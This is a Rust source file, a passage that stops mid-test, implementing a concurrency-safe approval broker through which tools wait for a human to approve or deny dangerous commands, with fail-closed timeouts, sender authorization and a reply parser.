//! In-process approval broker for a session-bound terminal and the pre-lease
//! gateway control-plane ingress.
//!
//! The broker owns pending approval requests keyed by a stable gateway route,
//! never by a rotating transcript id. A tool that needs a human decision calls
//! [`ApprovalBroker::request_with_notify`] and awaits it; an inbound reply on the same route
//! resolves the oldest pending request via [`ApprovalBroker::resolve_text`].
//! Resolution is exactly once: whichever caller removes the pending entry under
//! the lock owns the outcome, so a reply that arrives the same instant a request
//! times out cannot be applied twice.
//!
//! The broker has no knowledge of the model transcript. Callers provide the
//! redacted command metadata needed by an adapter prompt and an opaque
//! `principal` that the authorization predicate compares against the reply
//! sender. That keeps the broker a pure control-plane primitive that a terminal
//! and every ingress can share without pulling in agent state.
//!
//! Concurrency note: every map mutation happens under a short std `Mutex`
//! critical section, and the only `.await` points are on the per-request
//! oneshot channel and the timeout timer, both taken after the lock is dropped.
//! No std mutex is ever held across an await.

use std::collections::{HashMap, HashSet, VecDeque};
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::Mutex;
use std::time::{Duration, Instant};

use tokio::sync::oneshot;

/// Process-global request counter. A single static guarantees ids are unique
/// across every broker instance that lives in this process, which is what makes
/// [`RequestInfo::id`] safe to route on even if a new broker is built after a
/// session reset.
static NEXT_SEQUENCE: AtomicU64 = AtomicU64::new(1);

const DEFAULT_TIMEOUT: Duration = Duration::from_secs(300);
const DEFAULT_MAX_PENDING_PER_ROUTE: usize = 16;
const DEFAULT_MAX_TOTAL_PENDING: usize = 1024;

/// A human decision. Persistence remains the terminal policy's responsibility.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum Decision {
    AllowOnce,
    AllowSession,
    AllowAlways,
    Deny { reason: Option<String> },
}

/// What an awaiting [`ApprovalBroker::request`] resolves to.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum Outcome {
    /// A human resolved the request with this decision.
    Decided(Decision),
    /// The configured timeout elapsed with no decision. Callers treat this as
    /// a denial (fail closed).
    TimedOut,
    /// The request was cancelled by a session boundary or run shutdown before a
    /// decision arrived. Callers treat this as a denial (fail closed).
    Cancelled,
}

/// Why a request could not be registered. The broker is bounded, so a route or
/// the process as a whole can be saturated. Overload is surfaced rather than
/// queued so the caller can fail closed immediately instead of blocking a tool
/// behind an unbounded backlog.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum SubmitError {
    /// The route already holds `max_pending_per_route` requests, or the process
    /// holds `max_total_pending`. Fail closed: deny the action.
    Overloaded,
}

/// The result of attempting to resolve a pending request from a reply.
///
/// Only [`ResolveOutcome::Resolved`] consumes a pending request. `Malformed`
/// and `Unauthorized` are deliberately non-consuming so an unrecognized message
/// or a message from someone who may not approve falls through to normal
/// handling and leaves the prompt live for the legitimate responder.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum ResolveOutcome {
    /// A pending request was consumed and its waiter woken with `decision`.
    Resolved {
        id: String,
        count: usize,
        decision: Decision,
    },
    /// Nothing was pending for the route or id. Non-consuming by definition.
    NoPending,
    /// The reply text did not parse to a decision. Non-consuming.
    Malformed,
    /// The authorization predicate rejected the reply sender. Non-consuming.
    Unauthorized,
}

/// A read-only view of one pending request, handed to the authorization
/// predicate and returned by the snapshot methods. It carries only opaque
/// routing metadata, never prompt or transcript content.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct RequestInfo {
    pub id: String,
    pub route_key: String,
    /// Opaque owner the reply sender must match to be authorized. Supplied by
    /// the requester; compared inside the caller's predicate.
    pub principal: String,
    pub command: String,
    pub description: String,
    pub pattern_keys: Vec<String>,
    pub allow_session: bool,
    pub allow_permanent: bool,
    pub smart_denied: bool,
    /// Time elapsed since the request was registered, sampled at snapshot time.
    pub age: Duration,
}

/// Adapter-facing fields needed to render an approval prompt. Keeping this
/// separate from [`RequestInfo`] means a stream consumer does not invent broker
/// routing metadata merely to display an immutable event.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub struct ApprovalPrompt<'a> {
    pub command: &'a str,
    pub description: &'a str,
    pub allow_session: bool,
    pub allow_permanent: bool,
    pub smart_denied: bool,
}

impl<'a> From<&'a RequestInfo> for ApprovalPrompt<'a> {
    fn from(info: &'a RequestInfo) -> Self {
        Self {
            command: &info.command,
            description: &info.description,
            allow_session: info.allow_session,
            allow_permanent: info.allow_permanent,
            smart_denied: info.smart_denied,
        }
    }
}

/// Render the universal text fallback used by push adapters. The request id
/// stays out of prose because typed replies resolve the route FIFO.
pub fn format_prompt(info: ApprovalPrompt<'_>, prefix: &str) -> String {
    let mut preview: String = info.command.chars().take(200).collect();
    if info.command.chars().count() > 200 {
        preview.push_str("...");
    }
    let heading = if info.smart_denied {
        "⚠️ **Smart DENY - owner override for one operation:**"
    } else {
        "⚠️ **Dangerous command requires approval:**"
    };
    let mut choices = vec![format!(
        "Reply `{prefix}approve` to execute this one operation"
    )];
    if info.allow_session && !info.smart_denied {
        choices.push(format!(
            "`{prefix}approve session` to approve this pattern for the session"
        ));
    }
    if info.allow_permanent && !info.smart_denied {
        choices.push(format!("`{prefix}approve always` to approve permanently"));
    }
    choices.push(format!("`{prefix}deny` to cancel"));
    let choices = match choices.split_last() {
        Some((last, [])) => last.clone(),
        Some((last, rest)) => format!("{}, or {last}", rest.join(", ")),
        None => String::new(),
    };
    format!(
        "{heading}\n```\n{preview}\n```\nReason: {}\n\n{choices}.",
        info.description
    )
}

pub fn confirmation_text(decision: &Decision, count: usize) -> String {
    let noun = if count == 1 { "command" } else { "commands" };
    match decision {
        Decision::AllowOnce => format!("✅ Approved {count} pending {noun} once."),
        Decision::AllowSession => {
            format!("✅ Approved {count} pending {noun} for this session.")
        }
        Decision::AllowAlways => format!("✅ Permanently approved {count} pending {noun}."),
        Decision::Deny {
            reason: Some(reason),
        } => {
            format!("❌ Denied {count} pending {noun}. Reason: {reason}")
        }
        Decision::Deny { reason: None } => format!("❌ Denied {count} pending {noun}."),
    }
}

/// What a caller supplies to open an approval request.
#[derive(Clone, Debug)]
pub struct RequestSpec {
    pub route_key: String,
    pub principal: String,
    pub command: String,
    pub description: String,
    pub pattern_keys: Vec<String>,
    pub allow_session: bool,
    pub allow_permanent: bool,
    pub smart_denied: bool,
    /// Per-request timeout. `None` uses the broker default.
    pub timeout: Option<Duration>,
}

impl RequestSpec {
    /// Convenience constructor that inherits the broker's default timeout.
    #[cfg(test)]
    pub fn new(
        route_key: impl Into<String>,
        principal: impl Into<String>,
        command: impl Into<String>,
    ) -> Self {
        Self {
            route_key: route_key.into(),
            principal: principal.into(),
            command: command.into(),
            description: "approval required".into(),
            pattern_keys: Vec::new(),
            allow_session: true,
            allow_permanent: true,
            smart_denied: false,
            timeout: None,
        }
    }
}

/// Tunable bounds and timing.
#[derive(Clone, Copy, Debug)]
pub struct BrokerConfig {
    pub default_timeout: Duration,
    pub max_pending_per_route: usize,
    pub max_total_pending: usize,
}

impl Default for BrokerConfig {
    fn default() -> Self {
        Self {
            default_timeout: DEFAULT_TIMEOUT,
            max_pending_per_route: DEFAULT_MAX_PENDING_PER_ROUTE,
            max_total_pending: DEFAULT_MAX_TOTAL_PENDING,
        }
    }
}

struct Pending {
    id: String,
    principal: String,
    command: String,
    description: String,
    pattern_keys: Vec<String>,
    allow_session: bool,
    allow_permanent: bool,
    smart_denied: bool,
    created_at: Instant,
    responder: oneshot::Sender<Decision>,
}

impl Pending {
    fn info(&self) -> RequestInfo {
        RequestInfo {
            id: self.id.clone(),
            route_key: String::new(),
            principal: self.principal.clone(),
            command: self.command.clone(),
            description: self.description.clone(),
            pattern_keys: self.pattern_keys.clone(),
            allow_session: self.allow_session,
            allow_permanent: self.allow_permanent,
            smart_denied: self.smart_denied,
            age: self.created_at.elapsed(),
        }
    }
}

#[derive(Default)]
struct State {
    /// FIFO of pending requests per route. The front is the oldest, which is
    /// the one a bare text reply resolves.
    routes: HashMap<String, VecDeque<Pending>>,
    /// Global id to route index so publication lookup and timeout reclaim are
    /// both O(1).
    id_route: HashMap<String, String>,
    total: usize,
    /// Session-scoped grants belong to the stable route, not a cached tool
    /// instance, so safe client eviction does not revoke user consent early.
    session_approvals: HashMap<String, HashSet<String>>,
}

/// Gateway-owned approval broker. Clone via `Arc` to share the same pending set
/// across terminal clients and ingress paths.
pub struct ApprovalBroker {
    state: Mutex<State>,
    config: BrokerConfig,
    /// Random per-broker salt mixed into ids so they are opaque and not simply
    /// a guessable sequence, even though the sequence alone already guarantees
    /// uniqueness.
    salt: u64,
}

/// Unlinks a registered request if its awaiting future is dropped. Normal
/// resolution and timeout remove the entry first, making this drop a no-op.
struct PendingGuard<'a> {
    broker: &'a ApprovalBroker,
    id: String,
}

impl Drop for PendingGuard<'_> {
    fn drop(&mut self) {
        self.broker.claim_timeout(&self.id);
    }
}

impl Default for ApprovalBroker {
    fn default() -> Self {
        Self::new()
    }
}

impl ApprovalBroker {
    pub fn new() -> Self {
        Self::with_config(BrokerConfig::default())
    }

    pub fn with_config(config: BrokerConfig) -> Self {
        Self {
            state: Mutex::new(State::default()),
            config,
            salt: random_salt(),
        }
    }

    /// Register a request and await a decision. Returns [`SubmitError`] without
    /// waiting if the route or the process is saturated, so the caller can fail
    /// closed. The returned [`Outcome`] is `Decided` only when a human actually
    /// resolved the request; `TimedOut` and `Cancelled` are both denials.
    #[cfg(test)]
    pub async fn request(&self, spec: RequestSpec) -> Result<Outcome, SubmitError> {
        self.request_with_notify(spec, |_| async { true }).await
    }

    /// Register, publish the immutable request snapshot, then await a decision.
    /// A failed publication removes the request and returns `Cancelled`, so a
    /// tool never waits for an approval prompt that no user could receive.
    pub async fn request_with_notify<F, Fut>(
        &self,
        spec: RequestSpec,
        notify: F,
    ) -> Result<Outcome, SubmitError>
    where
        F: FnOnce(RequestInfo) -> Fut,
        Fut: std::future::Future<Output = bool>,
    {
        let timeout = spec.timeout.unwrap_or(self.config.default_timeout);
        let id = self.mint_id();
        let (tx, rx) = oneshot::channel();
        let route_key = spec.route_key;
        let pending = Pending {
            id: id.clone(),
            principal: spec.principal,
            command: spec.command,
            description: spec.description,
            pattern_keys: spec.pattern_keys,
            allow_session: spec.allow_session,
            allow_permanent: spec.allow_permanent,
            smart_denied: spec.smart_denied,
            created_at: Instant::now(),
            responder: tx,
        };
        let mut info = pending.info();
        info.route_key = route_key.clone();

        {
            let mut state = self.state.lock().unwrap();
            if state.total >= self.config.max_total_pending {
                return Err(SubmitError::Overloaded);
            }
            let queue = state.routes.entry(route_key.clone()).or_default();
            if queue.len() >= self.config.max_pending_per_route {
                return Err(SubmitError::Overloaded);
            }
            queue.push_back(pending);
            state.id_route.insert(id.clone(), route_key);
            state.total += 1;
        }
        let _pending_guard = PendingGuard {
            broker: self,
            id: id.clone(),
        };

        if !notify(info).await {
            self.claim_timeout(&id);
            return Ok(Outcome::Cancelled);
        }

        // The lock is dropped. The only awaits below are the decision channel
        // and the timeout timer.
        let sleep = tokio::time::sleep(timeout);
        tokio::pin!(sleep);
        tokio::pin!(rx);

        tokio::select! {
            received = &mut rx => match received {
                Ok(decision) => Ok(Outcome::Decided(decision)),
                // The sender was dropped without sending: a cancellation.
                Err(_) => Ok(Outcome::Cancelled),
            },
            _ = &mut sleep => {
                // Claim the timeout by removing the entry. If a resolver already
                // removed it, the decision is in flight, so take that instead.
                if self.claim_timeout(&id) {
                    Ok(Outcome::TimedOut)
                } else {
                    match rx.await {
                        Ok(decision) => Ok(Outcome::Decided(decision)),
                        Err(_) => Ok(Outcome::Cancelled),
                    }
                }
            }
        }
    }

    /// Resolve the oldest pending request on a route from a typed reply. The
    /// text is parsed to a [`Decision`]; unrecognized text returns
    /// [`ResolveOutcome::Malformed`] and consumes nothing. `allowed` is called
    /// with the pending request's opaque metadata and must return true for the
    /// reply to take effect; a false result returns
    /// [`ResolveOutcome::Unauthorized`] and consumes nothing.
    pub fn resolve_text(
        &self,
        route_key: &str,
        text: &str,
        allowed: impl Fn(&RequestInfo) -> bool,
    ) -> ResolveOutcome {
        let mut state = self.state.lock().unwrap();
        let Some(queue) = state.routes.get(route_key) else {
            return ResolveOutcome::NoPending;
        };
        if queue.is_empty() {
            return ResolveOutcome::NoPending;
        }
        let Some(parsed) = parse_decision(text) else {
            return ResolveOutcome::Malformed;
        };
        let decision = parsed.decision;
        let take = if parsed.resolve_all { queue.len() } else { 1 };
        if !queue.iter().take(take).all(|pending| {
            let mut info = pending.info();
            info.route_key = route_key.to_owned();
            allowed(&info)
        }) {
            return ResolveOutcome::Unauthorized;
        }
        let mut removed = Vec::with_capacity(take);
        for _ in 0..take {
            let pending = state
                .routes
                .get_mut(route_key)
                .and_then(VecDeque::pop_front)
                .expect("head observed under the same lock");
            let id = pending.id.clone();
            self.unlink(&mut state, route_key, &id);
            removed.push(pending);
        }
        drop(state);
        let id = removed[0].id.clone();
        let count = removed.len();
        for pending in removed {
            let _ = pending.responder.send(decision.clone());
        }
        ResolveOutcome::Resolved {
            id,
            count,
            decision,
        }
    }

    pub fn has_pending(&self, route_key: &str) -> bool {
        self.state
            .lock()
            .unwrap()
            .routes
            .get(route_key)
            .is_some_and(|queue| !queue.is_empty())
    }

    pub fn is_session_approved(&self, route_key: &str, pattern_key: &str) -> bool {
        self.state
            .lock()
            .unwrap()
            .session_approvals
            .get(route_key)
            .is_some_and(|keys| keys.contains(pattern_key))
    }

    pub fn approve_for_session(&self, route_key: &str, pattern_key: &str) {
        self.state
            .lock()
            .unwrap()
            .session_approvals
            .entry(route_key.to_owned())
            .or_default()
            .insert(pattern_key.to_owned());
    }

    /// Test snapshot of every pending request. Ordering across routes is
    /// unspecified; production ingress resolves by stable route.
    #[cfg(test)]
    pub fn list(&self) -> Vec<RequestInfo> {
        let state = self.state.lock().unwrap();
        let mut out = Vec::with_capacity(state.total);
        for (route_key, queue) in state.routes.iter() {
            for pending in queue.iter() {
                let mut info = pending.info();
                info.route_key = route_key.clone();
                out.push(info);
            }
        }
        out
    }

    /// Snapshot the pending requests on one route, oldest first.
    #[cfg(test)]
    pub fn route_snapshot(&self, route_key: &str) -> Vec<RequestInfo> {
        let state = self.state.lock().unwrap();
        state
            .routes
            .get(route_key)
            .map(|queue| {
                queue
                    .iter()
                    .map(|pending| {
                        let mut info = pending.info();
                        info.route_key = route_key.to_owned();
                        info
                    })
                    .collect()
            })
            .unwrap_or_default()
    }

    /// Cancel every pending request on one route, waking each waiter with
    /// [`Outcome::Cancelled`]. Called on a session boundary so an approval that
    /// predates the new conversation on the same stable route cannot resolve
    /// into it. Returns how many requests were cancelled.
    pub fn cancel_route(&self, route_key: &str) -> usize {
        let mut state = self.state.lock().unwrap();
        state.session_approvals.remove(route_key);
        let Some(queue) = state.routes.remove(route_key) else {
            return 0;
        };
        let count = queue.len();
        for pending in &queue {
            state.id_route.remove(&pending.id);
        }
        state.total -= count;
        // Dropping `queue` here drops each responder sender, which wakes every
        // waiter with a cancellation. Senders are dropped after the maps are
        // consistent but the lock is still held, which is fine because sending
        // (and dropping) a oneshot never awaits.
        drop(state);
        drop(queue);
        count
    }

    /// Cancel every pending request across all routes, for run shutdown.
    /// Returns how many requests were cancelled.
    pub fn shutdown(&self) -> usize {
        let mut state = self.state.lock().unwrap();
        let drained: Vec<VecDeque<Pending>> =
            state.routes.drain().map(|(_, queue)| queue).collect();
        state.id_route.clear();
        state.session_approvals.clear();
        let count = state.total;
        state.total = 0;
        drop(state);
        drop(drained);
        count
    }

    fn claim_timeout(&self, id: &str) -> bool {
        let mut state = self.state.lock().unwrap();
        let Some(route_key) = state.id_route.get(id).cloned() else {
            return false;
        };
        let removed = state
            .routes
            .get_mut(&route_key)
            .and_then(|queue| {
                queue
                    .iter()
                    .position(|pending| pending.id == id)
                    .and_then(|position| queue.remove(position))
            })
            .is_some();
        if removed {
            self.unlink(&mut state, &route_key, id);
        }
        removed
    }

    /// Drop the id index entry, the route bucket if it is now empty, and the
    /// total counter. Caller already removed the `Pending` from its queue.
    fn unlink(&self, state: &mut State, route_key: &str, id: &str) {
        if state.id_route.remove(id).is_some() {
            state.total -= 1;
        }
        if state
            .routes
            .get(route_key)
            .map(VecDeque::is_empty)
            .unwrap_or(false)
        {
            state.routes.remove(route_key);
        }
    }

    fn mint_id(&self) -> String {
        let sequence = NEXT_SEQUENCE.fetch_add(1, Ordering::Relaxed);
        format!("apr_{:016x}{:012x}", self.salt, sequence)
    }
}

/// Parse a typed reply into a decision. Recognizes the common one-word forms a
/// human uses in a terminal or chat, with an optional leading `/` or `!`. Any
/// other text is treated as not an approval reply so it falls through.
#[derive(Clone, Debug, PartialEq, Eq)]
struct ParsedDecision {
    decision: Decision,
    resolve_all: bool,
}

fn parse_decision(text: &str) -> Option<ParsedDecision> {
    let raw = text.trim().trim_start_matches(['/', '!']).trim();
    let lower = raw.to_ascii_lowercase();
    if matches!(
        lower.as_str(),
        "approve"
            | "approve once"
            | "allow"
            | "allow once"
            | "once"
            | "yes"
            | "ok"
            | "okay"
            | "confirm"
            | "y"
            | "👍"
    ) {
        return Some(ParsedDecision {
            decision: Decision::AllowOnce,
            resolve_all: false,
        });
    }
    if matches!(
        lower.as_str(),
        "session" | "approve session" | "session approve"
    ) {
        return Some(ParsedDecision {
            decision: Decision::AllowSession,
            resolve_all: false,
        });
    }
    if matches!(
        lower.as_str(),
        "always" | "allow always" | "approve always" | "always approve" | "remember"
    ) {
        return Some(ParsedDecision {
            decision: Decision::AllowAlways,
            resolve_all: false,
        });
    }
    if matches!(
        lower.as_str(),
        "deny" | "no" | "n" | "cancel" | "reject" | "nevermind" | "👎"
    ) {
        return Some(ParsedDecision {
            decision: Decision::Deny { reason: None },
            resolve_all: false,
        });
    }

    let mut words = raw.split_whitespace();
    match words.next()?.to_ascii_lowercase().as_str() {
        "approve" | "allow" => {
            let remaining = words.map(str::to_ascii_lowercase).collect::<Vec<_>>();
            let resolve_all = remaining.iter().any(|word| word == "all");
            let decision = if remaining
                .iter()
                .any(|word| matches!(word.as_str(), "always" | "permanent" | "permanently"))
            {
                Decision::AllowAlways
            } else if remaining
                .iter()
                .any(|word| matches!(word.as_str(), "session" | "ses"))
            {
                Decision::AllowSession
            } else if remaining.iter().all(|word| word == "all" || word == "once") {
                Decision::AllowOnce
            } else {
                return None;
            };
            Some(ParsedDecision {
                decision,
                resolve_all,
            })
        }
        "deny" => {
            let rest = raw
                .split_once(char::is_whitespace)
                .map_or("", |(_, rest)| rest);
            let mut reason = rest.trim();
            let resolve_all = reason
                .split_whitespace()
                .next()
                .is_some_and(|word| word.eq_ignore_ascii_case("all"));
            if resolve_all {
                reason = reason
                    .split_once(char::is_whitespace)
                    .map_or("", |(_, reason)| reason)
                    .trim();
            }
            let reason: String = reason.chars().take(280).collect();
            Some(ParsedDecision {
                decision: Decision::Deny {
                    reason: (!reason.is_empty()).then_some(reason),
                },
                resolve_all,
            })
        }
        _ => None,
    }
}

fn random_salt() -> u64 {
    use std::hash::{BuildHasher, Hasher, RandomState};
    // RandomState is seeded from process entropy on construction, so hashing a
    // couple of runtime-varying values yields an unpredictable salt without
    // pulling in an rng dependency.
    let mut hasher = RandomState::new().build_hasher();
    hasher.write_u64(NEXT_SEQUENCE.load(Ordering::Relaxed));
    let now = Instant::now();
    hasher.write_usize(&now as *const _ as usize);
    hasher.finish()
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::sync::Arc;

    fn allow_all(_info: &RequestInfo) -> bool {
        true
    }

    async fn wait_for_pending(broker: &ApprovalBroker, count: usize) {
        for _ in 0..1000 {
            if broker.list().len() == count {
                return;
            }
            tokio::task::yield_now().await;
        }
        panic!("timed out waiting for {count} pending requests");
    }

    #[tokio::test]
    async fn ids_are_globally_unique_and_opaque() {
        let broker = ApprovalBroker::new();
        let a = broker.mint_id();
        let b = broker.mint_id();
        assert_ne!(a, b);
        assert!(a.starts_with("apr_"));
        // A second broker keeps drawing from the same global sequence, so its
        // ids never collide with the first broker's.
        let other = ApprovalBroker::new();
        assert_ne!(other.mint_id(), a);
    }

    #[tokio::test]
    async fn text_reply_resolves_the_oldest_request_first() {
        let broker = Arc::new(ApprovalBroker::new());
        let first = {
            let broker = broker.clone();
            tokio::spawn(async move {
                broker
                    .request(RequestSpec::new("route", "p", "first"))
                    .await
            })
        };
        wait_for_pending(&broker, 1).await;
        let second = {
            let broker = broker.clone();
            tokio::spawn(async move {
                broker
                    .request(RequestSpec::new("route", "p", "second"))
                    .await
            })
        };
        wait_for_pending(&broker, 2).await;

        let snapshot = broker.route_snapshot("route");
        assert_eq!(snapshot[0].command, "first");
        assert_eq!(snapshot[1].command, "second");

        assert!(matches!(
            broker.resolve_text("route", "approve", allow_all),
            ResolveOutcome::Resolved {
                decision: Decision::AllowOnce,
                ..
            }
        ));
        assert!(matches!(
            broker.resolve_text("route", "deny", allow_all),
            ResolveOutcome::Resolved {
                decision: Decision::Deny { reason: None },
                ..
            }
        ));

        assert_eq!(
            first.await.unwrap(),
            Ok(Outcome::Decided(Decision::AllowOnce))
        );
        assert_eq!(
            second.await.unwrap(),
            Ok(Outcome::Decided(Decision::Deny { reason: None }))
        );
    }

    #[tokio::test]
    async fn session_batch_and_deny_reason_match_gateway_commands() {
        let broker = Arc::new(ApprovalBroker::new());
        let mut handles = Vec::new();
        for command in ["one", "two", "three"] {
            let broker = broker.clone();
            handles.push(tokio::spawn(async move {
                broker
                    .request(RequestSpec::new("route", "p", command))
                    .await
            }));
        }
        wait_for_pending(&broker, 3).await;
        assert!(matches!(
            broker.resolve_text("route", "/approve all session", allow_all),
            ResolveOutcome::Resolved {
                count: 3,
                decision: Decision::AllowSession,
                ..
            }
        ));
        for handle in handles {
            assert_eq!(
                handle.await.unwrap(),
                Ok(Outcome::Decided(Decision::AllowSession))
            );
        }

        let broker_for_waiter = broker.clone();
        let denied = tokio::spawn(async move {
            broker_for_waiter
                .request(RequestSpec::new("route", "p", "four"))
                .await
        });
        wait_for_pending(&broker, 1).await;
        let reason = "x".repeat(400);
        let reply = format!("/deny {reason}");
        assert!(matches!(
            broker.resolve_text("route", &reply, allow_all),
            ResolveOutcome::Resolved {
                count: 1,
                decision: Decision::Deny { reason: Some(reason) },
                ..
            } if reason.chars().count() == 280
        ));
        assert!(matches!(
            denied.await.unwrap(),
            Ok(Outcome::Decided(Decision::Deny { reason: Some(reason) }))
                if reason.chars().count() == 280
        ));
    }

    #[tokio::test]
    async fn timeout_yields_timed_out_and_clears_the_request() {
        let broker = ApprovalBroker::with_config(BrokerConfig {
            default_timeout: Duration::from_millis(20),
            ..BrokerConfig::default()
        });
        let outcome = broker
            .request(RequestSpec::new("route", "p", "act"))
            .await
            .unwrap();
        assert_eq!(outcome, Outcome::TimedOut);
        assert!(broker.list().is_empty());
    }

    #[tokio::test]
    async fn dropping_an_awaiting_request_unlinks_it_immediately() {
        let broker = Arc::new(ApprovalBroker::with_config(BrokerConfig {
            default_timeout: Duration::from_secs(60),
            ..BrokerConfig::default()
        }));
        let waiter = {
            let broker = broker.clone();
            tokio::spawn(async move {
                broker
                    .request(RequestSpec::new("route", "owner", "act"))
                    .await
            })
        };
        wait_for_pending(&broker, 1).await;
        waiter.abort();
        assert!(waiter.await.unwrap_err().is_cancelled());
        assert!(broker.list().is_empty());
        assert!(!broker.has_pending("route"));
    }

    #[tokio::test]
    async fn unauthorized_and_malformed_replies_do_not_consume() {
        let broker = Arc::new(ApprovalBroker::new());
        let handle = {
            let broker = broker.clone();
            tokio::spawn(async move {
                broker
                    .request(RequestSpec::new("route", "owner", "act"))
                    .await
            })
        };
        wait_for_pending(&broker, 1).await;

        // Malformed text is not an approval reply.
        assert_eq!(
            broker.resolve_text("route", "what is this", allow_all),
            ResolveOutcome::Malformed
        );
        // A sender who is not the owner may not approve.
        assert_eq!(
            broker.resolve_text("route", "approve", |info| info.principal == "someone-else"),
            ResolveOutcome::Unauthorized
        );
        // The request is still pending after both non-consuming replies.
        assert_eq!(broker.list().len(), 1);

        // The legitimate owner still resolves it.
        assert!(matches!(
            broker.resolve_text("route", "approve", |info| info.principal == "owner"),
            ResolveOutcome::Resolved { .. }
        ));
        assert_eq!(
            handle.await.unwrap(),
            Ok(Outcome::Decided(Decision::AllowOnce))
        );
    }

    #[tokio::test]
    async fn batch_resolution_requires_authorization_for_every_request() {
        let broker = Arc::new(ApprovalBroker::new());
        let first = {
            let broker = broker.clone();
            tokio::spawn(async move {
                broker
                    .request(RequestSpec::new("shared", "owner-a", "first"))
                    .await
            })
        };
        wait_for_pending(&broker, 1).await;
        let second = {
            let broker = broker.clone();
            tokio::spawn(async move {
                broker
                    .request(RequestSpec::new("shared", "owner-b", "second"))
                    .await
            })
        };
        wait_for_pending(&broker, 2).await;

        assert_eq!(
            broker.resolve_text("shared", "/approve all", |info| info.principal == "owner-a"),
            ResolveOutcome::Unauthorized
        );
        assert_eq!(broker.list().len(), 2);
        assert!(matches!(
            broker.resolve_text("shared", "/approve", |info| info.principal == "owner-a"),
            ResolveOutcome::Resolved { count: 1, .. }
        ));
        assert!(matches!(
            broker.resolve_text("shared", "/deny", |info| info.principal == "owner-b"),
            ResolveOutcome::Resolved { count: 1, .. }
        ));
        assert!(matches!(
            first.await.unwrap(),
            Ok(Outcome::Decided(Decision::AllowOnce))
        ));
        assert!(matches!(
            second.await.unwrap(),
            Ok(Outcome::Decided(Decision::Deny { reason: None }))
        ));
    }

    #[tokio::test]
    async fn cancel_route_is_scoped_and_wakes_waiters() {
        let broker = Arc::new(ApprovalBroker::new());
        broker.approve_for_session("target", "recursive delete");
        broker.approve_for_session("other", "force push");
        let target = {
            let broker = broker.clone();
            tokio::spawn(async move { broker.request(RequestSpec::new("target", "p", "a")).await })
        };
        wait_for_pending(&broker, 1).await;
        let other = {
            let broker = broker.clone();
            tokio::spawn(async move { broker.request(RequestSpec::new("other", "p", "b")).await })
        };
        wait_for_pending(&broker, 2).await;

        assert_eq!(broker.cancel_route("target"), 1);
        assert_eq!(target.await.unwrap(), Ok(Outcome::Cancelled));
        assert!(!broker.is_session_approved("target", "recursive delete"));

        // The unrelated route is untouched.
        assert_eq!(broker.route_snapshot("other").len(), 1);
        assert!(broker.is_session_approved("other", "force push"));
        broker.shutdown();
        assert_eq!(other.await.unwrap(), Ok(Outcome::Cancelled));
    }

    #[tokio::test]
    async fn cancellation_during_notification_returns_cancelled_without_panicking() {
        let broker = ApprovalBroker::new();
        let outcome = broker
            .request_with_notify(RequestSpec::new("route", "owner", "command"), |_| async {
                broker.cancel_route("route");
                true
            })
            .await;
        assert_eq!(outcome, Ok(Outcome::Cancelled));
        assert!(!broker.has_pending("route"));
    }

    #[tokio::test]
    async fn shutdown_cancels_every_route() {
        let broker = Arc::new(ApprovalBroker::new());
        let mut handles = Vec::new();
        for route in ["r1", "r2", "r3"] {
            let broker = broker.clone();
            handles.push(tokio::spawn(async move {
                broker.request(RequestSpec::new(route, "p", "a")).await
            }));
        }
        wait_for_pending(&broker, 3).await;
        assert_eq!(broker.shutdown(), 3);
        assert!(broker.list().is_empty());
        for handle in handles {
            assert_eq!(handle.await.unwrap(), Ok(Outcome::Cancelled));
        }
    }

    #[tokio::test]
    async fn overload_fails_closed_per_route_and_globally() {
        let broker = Arc::new(ApprovalBroker::with_config(BrokerConfig {
            default_timeout: Duration::from_secs(60),
            max_pending_per_route: 2,
            max_total_pending: 3,
        }));
        let mut handles = Vec::new();
        for action in ["a", "b"] {
            let broker = broker.clone();
            handles.push(tokio::spawn(async move {
                broker.request(RequestSpec::new("route", "p", action)).await
            }));
        }
        wait_for_pending(&broker, 2).await;

        // Route is at its per-route cap.
        assert_eq!(
            broker.request(RequestSpec::new("route", "p", "c")).await,
            Err(SubmitError::Overloaded)
        );

        // A different route still has headroom under the global cap.
        {
            let broker = broker.clone();
            handles.push(tokio::spawn(async move {
                broker.request(RequestSpec::new("other", "p", "d")).await
            }));
        }
        wait_for_pending(&broker, 3).await;

        // Now the process is at its global cap.
        assert_eq!(
            broker.request(RequestSpec::new("third", "p", "e")).await,
            Err(SubmitError::Overloaded)
        );

        broker.shutdown();
        for handle in handles {
            let _ = handle.await.unwrap();
        }
    }

    #[tokio::test(flavor = "multi_thread", worker_threads = 4)]
    async fn concurrent_replies_resolve_exactly_once() {
        let broker = Arc::new(ApprovalBroker::new());
        let handle = {
            let broker = broker.clone();
            tokio::spawn(async move { broker.request(RequestSpec::new("route", "p", "act")).await })
        };
        wait_for_pending(&broker, 1).await;

        let barrier = Arc::new(std::sync::Barrier::new(8));
        let threads: Vec<_> = (0..8)
            .map(|_| {
                let broker = broker.clone();
                let barrier = barrier.clone();
                std::thread::spawn(move || {
                    barrier.wait();
                    broker.resolve_text("route", "approve", allow_all)
                })
            })
            .collect();
        let resolved = threads
            .into_iter()
            .map(|thread| thread.join().unwrap())
            .filter(|outcome| matches!(outcome, ResolveOutcome::Resolved { .. }))
            .count();
        assert_eq!(resolved, 1);
        assert!(broker.list().is_empty());
        assert_eq!(
            handle.await.unwrap(),
            Ok(Outcome::Decided(Decision::AllowOnce))
        );
    }

    #[tokio::test]
    async fn a_reply_racing_a_timeout_still_reaches_the_waiter() {
        // A short timeout with a reply fired right around expiry must not lose
        // the decision: whoever removes the entry owns the outcome.
        for _ in 0..50 {
            let broker = ApprovalBroker::with_config(BrokerConfig {
                default_timeout: Duration::from_millis(5),
                ..BrokerConfig::default()
            });
            let broker = Arc::new(broker);
            let waiter = {
                let broker = broker.clone();
                tokio::spawn(
                    async move { broker.request(RequestSpec::new("route", "p", "act")).await },
                )
            };
            wait_for_pending(&broker, 1).await;
            let outcome = broker.resolve_text("route", "approve", allow_all);
            let waited = waiter.await.unwrap().unwrap();
            match outcome {
                ResolveOutcome::Resolved { decision, .. } => {
                    assert_eq!(waited, Outcome::Decided(decision));
                }
                ResolveOutcome::NoPending => {
                    // The timeout won the race and already cleared the entry.
